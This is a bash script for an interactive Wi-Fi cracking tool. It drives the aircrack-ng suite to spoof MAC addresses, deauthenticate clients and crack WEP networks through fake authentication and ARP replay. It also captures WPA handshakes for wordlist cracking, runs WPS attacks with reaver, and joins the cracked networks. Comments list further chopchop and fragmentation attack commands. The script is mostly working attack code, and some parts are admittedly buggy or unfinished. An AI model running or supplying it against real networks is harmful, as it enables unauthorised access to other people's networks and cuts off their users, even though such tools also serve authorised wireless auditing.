#!/bin/bash
#
# Things to do...
#
# WPA - Change pop-up. When would you like to crack this handshake? Now or Later
# When cracking multiple WEP APs in a row, there is an error after asking what channel to scan.

##############################################################################################################

f_start(){
clear

# H x W
printf '\033[8;40;50t'

echo
echo "____ ____ ____ ____ _  _            ____"
echo "|    |__/ |__| |    |_/     | | |   |__ "
echo "|___ |  \ |  | |___ | \_    |_|_| i |   i"
echo
echo "By Lee Baird & Jason Arnold"
echo
echo

# Check for wireless adaptor
iwconfig > tmp 2>/dev/null

if [ ! -s tmp ]; then
     zenity --error --text "No wireless device found. If you are using a VM, make sure your USB card is enabled."
     rm tmp 2>/dev/null
     exit
fi

echo -e "\e[1;33m[*] Setting variables.\e[0m"

break="=================================================="
datestamp=$(date +%F_%T)
interface=$(grep -m 1 '802' tmp | awk '{print $1}')
kernmod=$(airmon-ng | grep $interface | awk -F" " {'print $4'})
monitor=$(grep -m 1 'Monitor' tmp | awk '{print $1}')
resolution=$(xdpyinfo | grep 'dimensions:' | awk -F" " {'print $2'} | awk -F"x" {'print $1'})
workdir=/root/wifi-keys

if [ -z $kernmod ]; then
     kernmod=$(airmon-ng | grep $interface | awk -F" " {'print $3'})
fi

##############################################################################################################

# Check for wireless device
if [ $monitor ]; then
	airmon-ng stop $interface &>/dev/null
fi

if [ $interface ]; then
	echo
     echo -e "\e[1;33m[*] Initializing $interface wireless interface using kernel module $kernmod.\e[0m"
	killall dhclient3 &>/dev/null
	airmon-ng start $interface &>/dev/null
	iwconfig > tmp 2>/dev/null
	monitor=$(grep -m 1 'Monitor' tmp | awk '{print $1}')
	rm tmp 2>/dev/null
else
	zenity --error --text "No wireless device found. If you are using a VM, make sure your USB card is enabled."
	rm tmp 2>/dev/null
	echo
     echo
	exit
fi

##############################################################################################################

# Check to see if injection is working
echo
echo -e "\e[1;33m[*] Performing test to validate injection is working on $monitor.\e[0m"
aireplay-ng -9 $monitor > tmp
sleep 3

if grep -q 'Injection is working!' tmp; then
	rm tmp 2>/dev/null
else
	zenity --error --text "Injection is not working. Reconnect your wireless card and try again."
	rm tmp 2>/dev/null
	echo
     echo
	exit
fi

##############################################################################################################

# Check working directory
if [ ! -d $workdir ]; then
	mkdir $workdir
fi

# Generate $workdir/keys file
if [ -f $workdir/keys ]; then
	echo
	delimetertest=$(grep '\^' $workdir/keys)

	if [ -z $delimetertest ]; then
		echo "Your $workdir/keys file is out of date. You need to open it in a text editor and replace all appropriate spaces with ^ symbols."
		echo "The lines in the file should look like below when this has been done correctly. Do this for all the lines."
		echo ""
		echo "No^Network^Ch^Password^Encryption^IVs^Notes"
		echo "1^WIFINET^8^passphrase1^WPA^n/a^First network passphrase guessed"
		echo "2^WIFI NET^5^passphrase2^WPA^n/a^Note that this ESSID has a space in the name"
		echo ""
		echo "Make these changes, then re-launch the program."
		echo
          echo
          exit
	fi

else
	echo No^Network^Ch^Password^Encryption^IVs^Notes > $workdir/keys
fi

# Generate .editor config file
if [ -f .editor ]; then
     Editor=`cat .editor`
else
	zenity --question --text "What is your default text editor?" --cancel-label=vi --ok-label=gedit

	if [ $? = 0 ]; then
	     Editor=gedit
		echo gedit > .editor
	else
		Editor=vi
		echo vi > .editor
	fi
fi

f_menu
}

##############################################################################################################

f_menu(){
clear
echo
echo "____ ____ ____ ____ _  _            ____"
echo "|    |__/ |__| |    |_/     | | |   |__ "
echo "|___ |  \ |  | |___ | \_    |_|_| i |   i"
echo
echo "By Lee Baird & Jason Arnold"
echo
echo
echo -e "\e[1;34mInterface: $interface  Monitor: $monitor  Module: $kernmod\e[0m"
echo
echo "1.  Scan for WEP and WPA networks"
echo "2.  Scan for WPS networks - TESTING"
echo "3.  Crack WEP networks"
echo "4.  Crack WPA networks"
echo "5.  Keys - view/edit Key file or join a network"
echo "6.  Exit"
echo
echo -n "Choice: "
read choice

case $choice in
     1) f_scan;;
     2) f_scanWPS;;
     3) f_crackWEP;;
     4) f_crackWPA;;
     5) f_keys;;
     6)
     airmon-ng stop $monitor &>/dev/null
     killall -q wpa_supplicant
     killall -q dhclient
     ifconfig $interface down

     f_clean
     echo && echo && exit;;
     *) f_error;;
esac
}

##############################################################################################################

f_clean(){
rm *.cap 2>/dev/null
rm *.csv 2>/dev/null
rm *.netxml 2>/dev/null
rm $workdir/keys~ 2>/dev/null
rm /var/run/wpa_supplicant/wlan0 2>/dev/null
rm /var/run/wpa_supplicant/wlan1 2>/dev/null
rm tmp 2>/dev/null
}

##############################################################################################################

f_error(){
echo
echo -e "\e[1;31m$break\e[0m"
echo
echo -e "\e[1;31m            *** Invalid choice. ***\e[0m"
echo
echo -e "\e[1;31m$break\e[0m"
sleep 2
f_menu
}

##############################################################################################################

f_keys(){
clear

column -s ^ -t $workdir/keys

zz=$(zenity --list --column "                   Cracked Networks" --text "" "Edit file" "Join a network")

if [[ $zz = "Edit file" ]]; then
	$Editor $workdir/keys
	f_menu
elif [[ $zz =  "Join a network" ]]; then
	No=`zenity --entry --text "Enter the number of the network you wish to join:"`
     let line=$No+1
     head -n $line $workdir/keys | tail -n 1 > tmp
	x=$(cat tmp | awk -F"^" '{print $2}')
	y=$(cat tmp | awk -F"^" '{print $4}')
	z=$(cat tmp | awk -F"^" '{print $5}')
	echo
	echo $break
	echo

	if [ $z = "WPA" ]; then
		# WPA join code goes here
		wpakey=$(wpa_passphrase "$x" $y | grep 'psk' | grep -v '#psk' | awk -F"=" {'print $2'})
		wpasupp=/tmp/wpa_supplicant.conf
	     # Create /tmp/wpa_supplicant.conf file
	     echo "" > $wpasupp
	     echo "ctrl_interface=/var/run/wpa_supplicant" >> $wpasupp
	     echo "" >> $wpasupp
	     echo "network={" >> $wpasupp
	     echo "   ssid=\"$x\"" >> $wpasupp
	     echo "   scan_ssid=1" >> $wpasupp
	     echo "   proto=WPA RSN" >> $wpasupp
	     echo "   key_mgmt=WPA-PSK" >> $wpasupp
	     echo "   pairwise=CCMP TKIP" >> $wpasupp
	     echo "   group=CCMP TKIP" >> $wpasupp
	     echo "   psk=$wpakey" >> $wpasupp
	     echo "}" >> $wpasupp

	     wpa_supplicant -B -i$interface -Dwext -c$wpasupp
	     sleep 2

	     dhclient $interface
	     sleep 2

	     echo
	     echo "Now connected to the wireless network \"$x\"."
	     echo
	     echo -n "When ready to disconnect, type EXIT and press <return> to continue: "; read DISC

	     if [ $DISC = "EXIT" ]; then
	          killall -q wpa_supplicant
	          killall -q dhclient
	          ifconfig $interface down
	          sleep 5
	          f_menu
		else
		     $ERROR
	     fi

	elif [ $z = "WEP" ]; then
		# WEP join code goes here
		airmon-ng stop $monitor &>/dev/null
		ifconfig $interface down
		iwconfig $interface essid "$x" key "$y"
		ifconfig $interface up
		sleep 1

		dhclient $interface
		echo
		echo
		echo "Now connected to the wireless network \"$x\"."
		echo
		echo -n "When ready to disconnect, type EXIT and press <return> to continue: " ; read DISC

		if [ $DISC = "EXIT" ]; then
		     killall -q dhclient
		     ifconfig $interface down
		     sleep 3
		     f_menu
		else
			f_menu
		fi
	fi
fi
}

##############################################################################################################

f_options(){
echo
echo $break
echo
echo "Enter the options for your attack."
echo
echo -n "ESSID:    "
read ESSID

# Check for no answer
if [ -z "$ESSID" ]; then
	f_error
fi

if grep -q '$ESSID' $workdir/keys; then
	echo
	zenity --info --text "This network has already been cracked."
	f_menu
fi

echo -n "Channel:  "
read Channel

f_validChannel $Channel

# Check for no answer
if [ -z $Channel ]; then
	f_error
fi

echo -n "BSSID:    "
read BSSID

# Check for no answer
if [ -z $BSSID ]; then
	f_error
fi

# Validate MAC address
if f_validMAC ! "$BSSID"; then
     printf "Sorry, %s is not a valid MAC address\n" "$BSSID" >&2
     read -p "Press <return> to continue."
     f_crackWEP
fi
}

##############################################################################################################

f_return(){
zenity --info --text "Press <return> to continue."

f_menu
}

##############################################################################################################

f_spoof(){
echo
echo $break
echo
echo -e "\e[1;33m[*] Spoofing MAC address.\e[0m"
echo

ifconfig $monitor down
macchanger -r $monitor
ifconfig $monitor up

FakeMAC=`macchanger -s $monitor | awk '{print $3}'`

echo
echo $break
echo
}

##############################################################################################################

f_validChannel(){
check=$(echo $1 | grep -e [^0-9])

if [ $? -eq 0 ]; then
	f_error
fi

if [ "$1" != "" ]; then
	if [ $1 -lt 1 ] || [ $1 -gt 11 ]; then
		f_error
	fi
fi
}

##############################################################################################################

f_validMAC(){
ERROR=0
oldIFS=$IFS
IFS=:
set -f
set -- $1

if [ $# -eq 6 ]; then
     for seg; do
          case $seg in
               ""|*[!0-9a-fA-F]*)
               ERROR=1
               break
               ;; # Segment empty or non-hexadecimal
               ??)
               ;; # Segment with 2 caracters are ok
               *)
               ERROR=1
               break
               ;;
          esac
     done
else
     ERROR=2 ## Not 6 segments
fi

IFS=$oldIFS
set +f

return $ERROR
}

##############################################################################################################

f_scan(){
echo
echo $break
echo
echo -e "\e[1;33mOnce scanning begins, press ctl+c to exit and return to main menu.\e[0m"
echo
echo "Enter a channel or press <return> for all."
echo -n "Channel (1-11): "
read Channel

f_validChannel $Channel

# Optimized for 17" MacBook Pro 1920x1200, change the geometry as needed (width x height + x + y)

if [ $resolution -ge "1900" ]; then
 	if [ -z $Channel ]; then
		xterm -bg blue -fg white -fn 10x20 -geometry 94x60+0+0 -title WEP -e airodump-ng --encrypt wep $monitor --output-format pcap &
		sleep 1
		xterm -bg blue -fg white -fn 10x20 -geometry 94x60+955+0 -title WPA -e airodump-ng --encrypt wpa $monitor --output-format pcap &
		f_menu
 	else
		xterm -bg blue -fg white -fn 10x20 -geometry 94x60+0+0 -title WEP -e airodump-ng --channel $Channel --encrypt wep $monitor --output-format pcap &
		sleep 1
		xterm -bg blue -fg white -fn 10x20 -geometry 94x60+955+0 -title WPA -e airodump-ng --channel $Channel --encrypt wpa $monitor --output-format pcap &
		f_menu
 	fi
else
 	if [ -z $Channel ]; then
		xterm -bg blue -fg white -geometry 125x25+0+10 -title WEP -e airodump-ng --encrypt wep $monitor &
		sleep 1
		xterm -bg blue -fg white -geometry 125x25+0+425 -title WPA -e airodump-ng --encrypt wpa $monitor &
		f_menu
 	else
		xterm -bg blue -fg white -geometry 125x25+0+10 -title WEP -e airodump-ng --channel $Channel --encrypt wep $monitor &
		sleep 1
		xterm -bg blue -fg white -geometry 125x25+0+425 -title WPA -e airodump-ng --channel $Channel --encrypt wpa $monitor &
		f_menu
 	fi
fi
}

##############################################################################################################

f_scanWPS(){
echo
echo $break
echo
echo -e "\e[1;33m[*] Run until you find a target network, then press ctl+c.\e[0m"
echo

# Change the geometry as needed (width x height + x + y)
xterm -bg blue -fg white -fn 10x20 -geometry 110x60+0+0 -title WPS -e wash -i $monitor -C &

f_options

reaver -i $monitor -b <BSSID> -e <ESSID> -f -c <channel> -a -vv
}

##############################################################################################################

f_crackWEP(){
f_validMAC
f_clean
f_spoof

echo -e "\e[1;33m[*] Let airodump-ng run until you find a target network, then press ctl+c.\e[0m"
echo
echo "Enter a channel or press <return> for all."
echo -n "Channel (1-11): "
read Channel

f_validChannel $Channel

if [ -z $Channel ]; then
	airodump-ng --encrypt WEP $monitor
else
	airodump-ng --channel $Channel --encrypt WEP $monitor
fi

zenity --question --text "Is the network you want to attack hidden (non-broadcasted SSID)?"

if [ $? = 0 ]; then
	a=$(zenity --entry --text "BSSID of target")
	e=$(zenity --entry --text "STATION MAC currently connected")

	echo "Enter a channel that the hidden network is running on."
	echo -n "Channel (1-11): "
	read Channel
	f_validChannel $Channel

	xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e airodump-ng -c $Channel --bssid $a -w output $monitor &
	xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+300 -hold -e aireplay-ng -0 30 -a $a -c $e $monitor &
fi

f_options

echo "(Spoofed MAC address is $FakeMAC if no Stations have associated yet.)"
echo -n "STATION:  "
read STATION

# Check for no answer
if [ -z $STATION ]; then
	f_error
fi

# Validate MAC address
if f_validMAC ! "$STATION"; then
     printf "Sorry, %s is not a valid MAC address\n" "$STATION" >&2
     read -p "Press <return> to continue."
     f_crackWEP
fi

# Optimized for 17" MacBook Pro 1920x1200, change the geometry as needed (width x height + x + y)

if [ $Channel = "?" ]; then
	xterm -bg blue -fg white -fn 10x20 -geometry 94x9+965+308 -hold -title "Deauthentication" -e aireplay-ng --deauth 10 -a $BSSID -c $STATION $monitor &
	echo -n "ESSID: "
	read ESSID
	pkill -9 -f xterm 2>/dev/null
fi

xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e airodump-ng -c $Channel --bssid $BSSID -w output $monitor &
sleep 5
xterm -bg blue -fg white -fn 10x20 -geometry 94x9+965+335 -hold -title "Fake Authentication" -e aireplay-ng --fakeauth 0 -e "$ESSID" -a $BSSID -h $FakeMAC $monitor &
sleep 20

zenity --question --text "Has association been successful?"

if [ $? = 1 ]; then
	zenity --info --text "MAC address filtering may be enabled."
	pkill -9 -f xterm 2>/dev/null
	f_menu
fi

xterm -bg blue -fg white -fn 10x20 -geometry 94x6+965+545 -hold -title "ARP Replay" -e aireplay-ng --arpreplay -b $BSSID -h $FakeMAC $monitor &
sleep 30

zenity --question --text "Look in the airodump-ng window. Is the value for #Data increasing?"

if [ $? = 1 ]; then
	pkill -9 -f xterm 2>/dev/null
	f_menu
fi

sleep 60

aircrack-ng -a 1 *.cap

pkill -9 xterm 2>/dev/null			# BUG - this is not working.  Still seeing output on the screen

echo "Your results will be saved to a file."
echo
echo "ESSID:   " "$ESSID"
echo "Channel: " $Channel
unset KEY
echo -n "KEY:      " $KEY
read KEY
KEY=$(echo "$KEY" | sed 's/://g')
echo -n "IVs:      " $IVs
read IVs
unset Notes
echo -n "Notes:    " $Notes
read Notes

No=`wc -l $workdir/keys | awk '{print $1}'`

echo "$No^$ESSID^$Channel^$KEY^WEP^$IVs^$Notes" >> $workdir/keys

f_connect
}

##############################################################################################################

f_connect(){
echo
echo -n "Would you like to connect to the wireless network? y/n  "
read -n 1 connect

if [ $connect == y ]; then
	pkill -9 -f xterm 2>/dev/null
	ifconfig $interface down
	iwconfig $interface essid "$ESSID" key $KEY
	ifconfig $interface up
	sleep 1
	dhclient $interface
	echo
	echo "Now connected to the new wireless network."
	f_menu
else
	pkill -9 -f xterm 2>/dev/null
	f_menu
fi
}

##############################################################################################################

# aireplay-ng --arpreplay -e (victim_access_point) -b (access_point_mac) $monitor
# aireplay-ng --chopchop -F -h (attacker_mac) $monitor
# packetforge-ng -0 -a (access_point_mac) -h (attacker_mac) -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w chop_chop.cap

# aireplay-ng --interactive -F -r /tmp/chop_chop.cap $monitor
# aireplay-ng --fragment -F -b (access_point_mac) -h (attacker_mac) $monitor
# packetforge-ng -0 -a (access_point_mac) -h (attacker_mac) -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w fragmented.cap

##############################################################################################################

f_crackWPA(){
f_validMAC
f_clean
f_spoof

echo -e "\e[1;33m[*] Let airodump-ng run until you find a target network, then press ctl+c.\e[0m"
echo
echo "Enter a channel or press <return> for all."
echo -n "Channel (1-11): "
read Channel

f_validChannel $Channel

if [ -z $Channel ]; then
	airodump-ng --encrypt WPA $monitor
else
	airodump-ng --channel $Channel --encrypt WPA $monitor
fi

zenity --question --text "Is the network you want to attack hidden (non-broadcasted SSID)?"

if [ $? = 0 ]; then
     a=$(zenity --entry --text BSSID)
     e=$(zenity --entry --text STATION)
     xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e aireplay-ng -0 10 -a $a -c $e $monitor &
fi

f_options

echo -n "STATION:  "
read STATION

# Check for no answer
if [ -z $STATION ]; then
	f_error
fi

# Validate MAC address
if f_validMAC ! "$STATION"; then
     printf "Sorry, %s is not a valid MAC address\n" "$STATION" >&2
     read -p "Press <return> to continue."
     f_crackWPA
fi

xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e airodump-ng --bssid $BSSID -c $Channel -w output $monitor &
# Insert aireplay code here for hidden networks
sleep 10
xterm -bg blue -fg white -fn 10x20 -geometry 94x12+965+345 -hold -title "Deauthentication" -e aireplay-ng --deauth 10 -a $BSSID -c $STATION $monitor &
sleep 30

zenity --question --text "Look in the airodump-ng window. Has a WPA handshake occured? If not, continue to wait. If so, click Yes."

if [ $? = 0 ]; then
	zenity --question --text "Would you like to store the capture file containing the handshake for later attack?"

	if [ $? = 0 ]; then
		pkill -9 -f xterm 2>/dev/null
		FIXEDESSID=$(echo "$ESSID" | sed 's/ /\\ /')

		if [ ! -d "$workdir/$datestamp/$FIXEDESSID" ]; then
			mkdir -p "$workdir/$datestamp/$FIXEDESSID"
		fi

		cp output* "$workdir/$datestamp/$FIXEDESSID"
		echo "Capture file(s) saved in $workdir/$datestamp/$FIXEDESSID"
		zenity --question --text "Would you like to save the capture file(s) to the desktop as well?"

		if [ $? = 0 ]; then
			cp output* ~/Desktop
		fi

		read -p "Press <return> to continue."
		f_menu
	fi

	zenity --info --text="Select a wordlist."
	wordlist=`zenity --file-selection --filename=/pentest/passwords/wordlists/rockyou.txt`

	pkill -9 -f xterm 2>/dev/null

	aircrack-ng -a 2 --bssid $BSSID *.cap -w $wordlist

	echo "Your results will be saved to a file."
	echo
	echo "ESSID:   " "$ESSID"
	echo "Channel: " $Channel
	unset KEY
	echo -n "KEY:      " $KEY
	read KEY
	unset Notes
	echo -n "Notes:    " $Notes
	read Notes

	No=`wc -l $workdir/keys | awk '{print $1}'`

	# Reference: No Network Ch Password Encryption IVs Notes > $workdir/keys
	echo "$No^$ESSID^$Channel^$KEY^WPA^n/a^$Notes" >> $workdir/keys
	f_return
else
	pkill -9 -f xterm 2>/dev/null
	# kill -9 `ps ax | grep 'airodump-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
	# kill -9 `ps ax | grep 'aireplay-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
	f_return
fi
}

##############################################################################################################

# Program
f_start

